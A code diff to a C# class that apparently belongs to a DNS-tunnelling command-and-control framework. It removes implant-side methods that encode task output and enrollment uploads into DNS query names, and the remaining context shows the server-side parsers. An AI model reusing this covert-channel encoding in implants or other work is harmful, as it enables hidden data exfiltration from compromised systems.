@@ -223,19 +223,6 @@ internal static class DnsContactNames
             + "." + zone;
 
     /// <summary>
-    /// Renders a channel-output chunk name (the implant-side twin of the
-    /// parser): c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
-    /// </summary>
-    public static string ChannelName(
-        ImplantId implant, TaskId task, int sequence, bool terminal, byte[] chunk, string zone)
-        => "c." + Encode(task.ToString())
-            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
-            + "." + (terminal ? "t" : "m")
-            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
-            + "." + Encode(implant.ToString())
-            + "." + zone;
-
-    /// <summary>
     /// Parses an enrollment-upload chunk against <paramref name="zone"/>:
     /// e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
     /// </summary>
@@ -279,23 +266,6 @@ internal static class DnsContactNames
             return null;
         return new EnrollAnswerProbe(token, sequence);
     }
-
-    /// <summary>
-    /// Renders an enrollment-upload chunk name (the implant-side twin of
-    /// the parser).
-    /// </summary>
-    public static string EnrollName(byte[] stream, int sequence, bool terminal, byte[] chunk, string zone)
-        => "e." + Encode(stream)
-            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
-            + "." + (terminal ? "t" : "m")
-            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
-            + "." + zone;
-
-    /// <summary>Renders an enrollment-answer probe name.</summary>
-    public static string EnrollAnswerName(byte[] token, int sequence, string zone)
-        => "a." + Encode(token)
-            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
-            + "." + zone;
 
     /// <summary>
     /// Parses a delivery probe against <paramref name="zone"/>:
